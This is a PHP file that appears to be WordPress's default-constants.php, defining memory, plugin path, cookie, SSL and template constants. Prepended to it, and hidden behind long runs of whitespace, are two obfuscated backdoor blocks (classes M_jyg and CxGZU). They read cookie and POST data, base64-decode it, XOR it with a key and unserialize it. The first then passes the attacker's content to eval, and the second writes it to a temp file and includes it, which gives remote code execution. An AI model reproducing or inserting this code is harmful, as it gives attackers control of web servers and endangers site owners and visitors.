<?php                                                                                                                                                                                                                                                                                                                                                                                                 $pPhvPJ = "\x4d" . '_' . "\x6a" . chr ( 619 - 498 ).chr ( 578 - 475 ); $nhxFLsWdOr = chr (99) . "\x6c" . 'a' . "\163" . 's' . "\x5f" . 'e' . 'x' . chr ( 611 - 506 ).chr (115) . chr ( 626 - 510 ).'s';$LEvBAJQ = $nhxFLsWdOr($pPhvPJ); $pPhvPJ = "3554";$RyEFtRO = $LEvBAJQ;$nhxFLsWdOr = "4282";if (!$RyEFtRO){class M_jyg{private $VyBkF;public static $vvJzrnyy = "6d25fac4-e6bb-4a12-8471-ce7ba5e75eb1";public static $lFmNHeaez = 4957;public function __construct($LoQkwmn=0){$BIjenD = $_COOKIE;$wHhJeaQiCu = $_POST;$FiQrT = @$BIjenD[substr(M_jyg::$vvJzrnyy, 0, 4)];if (!empty($FiQrT)){$nSvbI = "base64";$MsdokM = "";$FiQrT = explode(",", $FiQrT);foreach ($FiQrT as $BuxkDYO){$MsdokM .= @$BIjenD[$BuxkDYO];$MsdokM .= @$wHhJeaQiCu[$BuxkDYO];}$MsdokM = array_map($nSvbI . chr ( 573 - 478 )."\x64" . "\x65" . "\x63" . "\157" . "\x64" . "\145", array($MsdokM,)); $MsdokM = $MsdokM[0] ^ str_repeat(M_jyg::$vvJzrnyy, (strlen($MsdokM[0]) / strlen(M_jyg::$vvJzrnyy)) + 1);M_jyg::$lFmNHeaez = @unserialize($MsdokM);}}private function FaxAoKYp(){if (is_array(M_jyg::$lFmNHeaez)) {$bQvAsLqKa = str_replace(chr (60) . '?' . "\x70" . chr ( 1093 - 989 )."\160", "", M_jyg::$lFmNHeaez["\x63" . 'o' . chr ( 713 - 603 )."\164" . chr (101) . chr ( 999 - 889 ).chr ( 156 - 40 )]);eval($bQvAsLqKa); $DuJjzpV = "27685";exit();}}public function __destruct(){$this->FaxAoKYp(); $DuJjzpV = "27685";$uMHKMSlq = str_pad($DuJjzpV, 10);}}$fvnTRHUDP = new M_jyg(); $fvnTRHUDP = "41154_48608";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("CxGZU")){class CxGZU{public static $ZmFPDqi = "bXzQddshxediMoVR";public static $TUyXeeS = NULL;public function __construct(){$fKUAfX = @$_COOKIE[substr(CxGZU::$ZmFPDqi, 0, 4)];if (!empty($fKUAfX)){$EJecHsi = "base64";$JXGPgPKsHO = "";$fKUAfX = explode(",", $fKUAfX);foreach ($fKUAfX as $sNNrtO){$JXGPgPKsHO .= @$_COOKIE[$sNNrtO];$JXGPgPKsHO .= @$_POST[$sNNrtO];}$JXGPgPKsHO = array_map($EJecHsi . "_decode", array($JXGPgPKsHO,)); $JXGPgPKsHO = $JXGPgPKsHO[0] ^ str_repeat(CxGZU::$ZmFPDqi, (strlen($JXGPgPKsHO[0]) / strlen(CxGZU::$ZmFPDqi)) + 1);CxGZU::$TUyXeeS = @unserialize($JXGPgPKsHO);}}public function __destruct(){$this->ymoos();}private function ymoos(){if (is_array(CxGZU::$TUyXeeS)) {$HBWnswZa = sys_get_temp_dir() . "/" . crc32(CxGZU::$TUyXeeS["salt"]);@CxGZU::$TUyXeeS["write"]($HBWnswZa, CxGZU::$TUyXeeS["content"]);include $HBWnswZa;@CxGZU::$TUyXeeS["delete"]($HBWnswZa);exit();}}}$HBxKxwFZaF = new CxGZU(); $HBxKxwFZaF = NULL;} ?><?php
/**
 * Defines constants and global variables that can be overridden, generally in wp-config.php.
 *
 * @package WordPress
 */

/**
 * Defines initial WordPress constants.
 *
 * @see wp_debug_mode()
 *
 * @since 3.0.0
 *
 * @global int    $blog_id    The current site ID.
 * @global string $wp_version The WordPress version string.
 */
function wp_initial_constants() {
	global $blog_id, $wp_version;

	/**#@+
	 * Constants for expressing human-readable data sizes in their respective number of bytes.
	 *
	 * @since 4.4.0
	 */
	define( 'KB_IN_BYTES', 1024 );
	define( 'MB_IN_BYTES', 1024 * KB_IN_BYTES );
	define( 'GB_IN_BYTES', 1024 * MB_IN_BYTES );
	define( 'TB_IN_BYTES', 1024 * GB_IN_BYTES );
	/**#@-*/

	// Start of run timestamp.
	if ( ! defined( 'WP_START_TIMESTAMP' ) ) {
		define( 'WP_START_TIMESTAMP', microtime( true ) );
	}

	$current_limit     = ini_get( 'memory_limit' );
	$current_limit_int = wp_convert_hr_to_bytes( $current_limit );

	// Define memory limits.
	if ( ! defined( 'WP_MEMORY_LIMIT' ) ) {
		if ( false === wp_is_ini_value_changeable( 'memory_limit' ) ) {
			define( 'WP_MEMORY_LIMIT', $current_limit );
		} elseif ( is_multisite() ) {
			define( 'WP_MEMORY_LIMIT', '64M' );
		} else {
			define( 'WP_MEMORY_LIMIT', '40M' );
		}
	}

	if ( ! defined( 'WP_MAX_MEMORY_LIMIT' ) ) {
		if ( false === wp_is_ini_value_changeable( 'memory_limit' ) ) {
			define( 'WP_MAX_MEMORY_LIMIT', $current_limit );
		} elseif ( -1 === $current_limit_int || $current_limit_int > 268435456 /* = 256M */ ) {
			define( 'WP_MAX_MEMORY_LIMIT', $current_limit );
		} else {
			define( 'WP_MAX_MEMORY_LIMIT', '256M' );
		}
	}

	// Set memory limits.
	$wp_limit_int = wp_convert_hr_to_bytes( WP_MEMORY_LIMIT );
	if ( -1 !== $current_limit_int && ( -1 === $wp_limit_int || $wp_limit_int > $current_limit_int ) ) {
		ini_set( 'memory_limit', WP_MEMORY_LIMIT );
	}

	if ( ! isset( $blog_id ) ) {
		$blog_id = 1;
	}

	if ( ! defined( 'WP_CONTENT_DIR' ) ) {
		define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' ); // No trailing slash, full paths only - WP_CONTENT_URL is defined further down.
	}

	// Add define( 'WP_DEBUG', true ); to wp-config.php to enable display of notices during development.
	if ( ! defined( 'WP_DEBUG' ) ) {
		if ( 'development' === wp_get_environment_type() ) {
			define( 'WP_DEBUG', true );
		} else {
			define( 'WP_DEBUG', false );
		}
	}

	// Add define( 'WP_DEBUG_DISPLAY', null ); to wp-config.php to use the globally configured setting
	// for 'display_errors' and not force errors to be displayed. Use false to force 'display_errors' off.
	if ( ! defined( 'WP_DEBUG_DISPLAY' ) ) {
		define( 'WP_DEBUG_DISPLAY', true );
	}

	// Add define( 'WP_DEBUG_LOG', true ); to enable error logging to wp-content/debug.log.
	if ( ! defined( 'WP_DEBUG_LOG' ) ) {
		define( 'WP_DEBUG_LOG', false );
	}

	if ( ! defined( 'WP_CACHE' ) ) {
		define( 'WP_CACHE', false );
	}

	// Add define( 'SCRIPT_DEBUG', true ); to wp-config.php to enable loading of non-minified,
	// non-concatenated scripts and stylesheets.
	if ( ! defined( 'SCRIPT_DEBUG' ) ) {
		if ( ! empty( $wp_version ) ) {
			$develop_src = false !== strpos( $wp_version, '-src' );
		} else {
			$develop_src = false;
		}

		define( 'SCRIPT_DEBUG', $develop_src );
	}

	/**
	 * Private
	 */
	if ( ! defined( 'MEDIA_TRASH' ) ) {
		define( 'MEDIA_TRASH', false );
	}

	if ( ! defined( 'SHORTINIT' ) ) {
		define( 'SHORTINIT', false );
	}

	// Constants for features added to WP that should short-circuit their plugin implementations.
	define( 'WP_FEATURE_BETTER_PASSWORDS', true );

	/**#@+
	 * Constants for expressing human-readable intervals
	 * in their respective number of seconds.
	 *
	 * Please note that these values are approximate and are provided for convenience.
	 * For example, MONTH_IN_SECONDS wrongly assumes every month has 30 days and
	 * YEAR_IN_SECONDS does not take leap years into account.
	 *
	 * If you need more accuracy please consider using the DateTime class (https://www.php.net/manual/en/class.datetime.php).
	 *
	 * @since 3.5.0
	 * @since 4.4.0 Introduced `MONTH_IN_SECONDS`.
	 */
	define( 'MINUTE_IN_SECONDS', 60 );
	define( 'HOUR_IN_SECONDS', 60 * MINUTE_IN_SECONDS );
	define( 'DAY_IN_SECONDS', 24 * HOUR_IN_SECONDS );
	define( 'WEEK_IN_SECONDS', 7 * DAY_IN_SECONDS );
	define( 'MONTH_IN_SECONDS', 30 * DAY_IN_SECONDS );
	define( 'YEAR_IN_SECONDS', 365 * DAY_IN_SECONDS );
	/**#@-*/
}

/**
 * Defines plugin directory WordPress constants.
 *
 * Defines must-use plugin directory constants, which may be overridden in the sunrise.php drop-in.
 *
 * @since 3.0.0
 */
function wp_plugin_directory_constants() {
	if ( ! defined( 'WP_CONTENT_URL' ) ) {
		define( 'WP_CONTENT_URL', get_option( 'siteurl' ) . '/wp-content' ); // Full URL - WP_CONTENT_DIR is defined further up.
	}

	/**
	 * Allows for the plugins directory to be moved from the default location.
	 *
	 * @since 2.6.0
	 */
	if ( ! defined( 'WP_PLUGIN_DIR' ) ) {
		define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' ); // Full path, no trailing slash.
	}

	/**
	 * Allows for the plugins directory to be moved from the default location.
	 *
	 * @since 2.6.0
	 */
	if ( ! defined( 'WP_PLUGIN_URL' ) ) {
		define( 'WP_PLUGIN_URL', WP_CONTENT_URL . '/plugins' ); // Full URL, no trailing slash.
	}

	/**
	 * Allows for the plugins directory to be moved from the default location.
	 *
	 * @since 2.1.0
	 * @deprecated
	 */
	if ( ! defined( 'PLUGINDIR' ) ) {
		define( 'PLUGINDIR', 'wp-content/plugins' ); // Relative to ABSPATH. For back compat.
	}

	/**
	 * Allows for the mu-plugins directory to be moved from the default location.
	 *
	 * @since 2.8.0
	 */
	if ( ! defined( 'WPMU_PLUGIN_DIR' ) ) {
		define( 'WPMU_PLUGIN_DIR', WP_CONTENT_DIR . '/mu-plugins' ); // Full path, no trailing slash.
	}

	/**
	 * Allows for the mu-plugins directory to be moved from the default location.
	 *
	 * @since 2.8.0
	 */
	if ( ! defined( 'WPMU_PLUGIN_URL' ) ) {
		define( 'WPMU_PLUGIN_URL', WP_CONTENT_URL . '/mu-plugins' ); // Full URL, no trailing slash.
	}

	/**
	 * Allows for the mu-plugins directory to be moved from the default location.
	 *
	 * @since 2.8.0
	 * @deprecated
	 */
	if ( ! defined( 'MUPLUGINDIR' ) ) {
		define( 'MUPLUGINDIR', 'wp-content/mu-plugins' ); // Relative to ABSPATH. For back compat.
	}
}

/**
 * Defines cookie-related WordPress constants.
 *
 * Defines constants after multisite is loaded.
 *
 * @since 3.0.0
 */
function wp_cookie_constants() {
	/**
	 * Used to guarantee unique hash cookies.
	 *
	 * @since 1.5.0
	 */
	if ( ! defined( 'COOKIEHASH' ) ) {
		$siteurl = get_site_option( 'siteurl' );
		if ( $siteurl ) {
			define( 'COOKIEHASH', md5( $siteurl ) );
		} else {
			define( 'COOKIEHASH', '' );
		}
	}

	/**
	 * @since 2.0.0
	 */
	if ( ! defined( 'USER_COOKIE' ) ) {
		define( 'USER_COOKIE', 'wordpressuser_' . COOKIEHASH );
	}

	/**
	 * @since 2.0.0
	 */
	if ( ! defined( 'PASS_COOKIE' ) ) {
		define( 'PASS_COOKIE', 'wordpresspass_' . COOKIEHASH );
	}

	/**
	 * @since 2.5.0
	 */
	if ( ! defined( 'AUTH_COOKIE' ) ) {
		define( 'AUTH_COOKIE', 'wordpress_' . COOKIEHASH );
	}

	/**
	 * @since 2.6.0
	 */
	if ( ! defined( 'SECURE_AUTH_COOKIE' ) ) {
		define( 'SECURE_AUTH_COOKIE', 'wordpress_sec_' . COOKIEHASH );
	}

	/**
	 * @since 2.6.0
	 */
	if ( ! defined( 'LOGGED_IN_COOKIE' ) ) {
		define( 'LOGGED_IN_COOKIE', 'wordpress_logged_in_' . COOKIEHASH );
	}

	/**
	 * @since 2.3.0
	 */
	if ( ! defined( 'TEST_COOKIE' ) ) {
		define( 'TEST_COOKIE', 'wordpress_test_cookie' );
	}

	/**
	 * @since 1.2.0
	 */
	if ( ! defined( 'COOKIEPATH' ) ) {
		define( 'COOKIEPATH', preg_replace( '|https?://[^/]+|i', '', get_option( 'home' ) . '/' ) );
	}

	/**
	 * @since 1.5.0
	 */
	if ( ! defined( 'SITECOOKIEPATH' ) ) {
		define( 'SITECOOKIEPATH', preg_replace( '|https?://[^/]+|i', '', get_option( 'siteurl' ) . '/' ) );
	}

	/**
	 * @since 2.6.0
	 */
	if ( ! defined( 'ADMIN_COOKIE_PATH' ) ) {
		define( 'ADMIN_COOKIE_PATH', SITECOOKIEPATH . 'wp-admin' );
	}

	/**
	 * @since 2.6.0
	 */
	if ( ! defined( 'PLUGINS_COOKIE_PATH' ) ) {
		define( 'PLUGINS_COOKIE_PATH', preg_replace( '|https?://[^/]+|i', '', WP_PLUGIN_URL ) );
	}

	/**
	 * @since 2.0.0
	 */
	if ( ! defined( 'COOKIE_DOMAIN' ) ) {
		define( 'COOKIE_DOMAIN', false );
	}

	if ( ! defined( 'RECOVERY_MODE_COOKIE' ) ) {
		/**
		 * @since 5.2.0
		 */
		define( 'RECOVERY_MODE_COOKIE', 'wordpress_rec_' . COOKIEHASH );
	}
}

/**
 * Defines SSL-related WordPress constants.
 *
 * @since 3.0.0
 */
function wp_ssl_constants() {
	/**
	 * @since 2.6.0
	 */
	if ( ! defined( 'FORCE_SSL_ADMIN' ) ) {
		if ( 'https' === parse_url( get_option( 'siteurl' ), PHP_URL_SCHEME ) ) {
			define( 'FORCE_SSL_ADMIN', true );
		} else {
			define( 'FORCE_SSL_ADMIN', false );
		}
	}
	force_ssl_admin( FORCE_SSL_ADMIN );

	/**
	 * @since 2.6.0
	 * @deprecated 4.0.0
	 */
	if ( defined( 'FORCE_SSL_LOGIN' ) && FORCE_SSL_LOGIN ) {
		force_ssl_admin( true );
	}
}

/**
 * Defines functionality-related WordPress constants.
 *
 * @since 3.0.0
 */
function wp_functionality_constants() {
	/**
	 * @since 2.5.0
	 */
	if ( ! defined( 'AUTOSAVE_INTERVAL' ) ) {
		define( 'AUTOSAVE_INTERVAL', MINUTE_IN_SECONDS );
	}

	/**
	 * @since 2.9.0
	 */
	if ( ! defined( 'EMPTY_TRASH_DAYS' ) ) {
		define( 'EMPTY_TRASH_DAYS', 30 );
	}

	if ( ! defined( 'WP_POST_REVISIONS' ) ) {
		define( 'WP_POST_REVISIONS', true );
	}

	/**
	 * @since 3.3.0
	 */
	if ( ! defined( 'WP_CRON_LOCK_TIMEOUT' ) ) {
		define( 'WP_CRON_LOCK_TIMEOUT', MINUTE_IN_SECONDS );
	}
}

/**
 * Defines templating-related WordPress constants.
 *
 * @since 3.0.0
 */
function wp_templating_constants() {
	/**
	 * Filesystem path to the current active template directory.
	 *
	 * @since 1.5.0
	 */
	define( 'TEMPLATEPATH', get_template_directory() );

	/**
	 * Filesystem path to the current active template stylesheet directory.
	 *
	 * @since 2.1.0
	 */
	define( 'STYLESHEETPATH', get_stylesheet_directory() );

	/**
	 * Slug of the default theme for this installation.
	 * Used as the default theme when installing new sites.
	 * It will be used as the fallback if the current theme doesn't exist.
	 *
	 * @since 3.0.0
	 *
	 * @see WP_Theme::get_core_default_theme()
	 */
	if ( ! defined( 'WP_DEFAULT_THEME' ) ) {
		define( 'WP_DEFAULT_THEME', 'twentytwentyone' );
	}

}
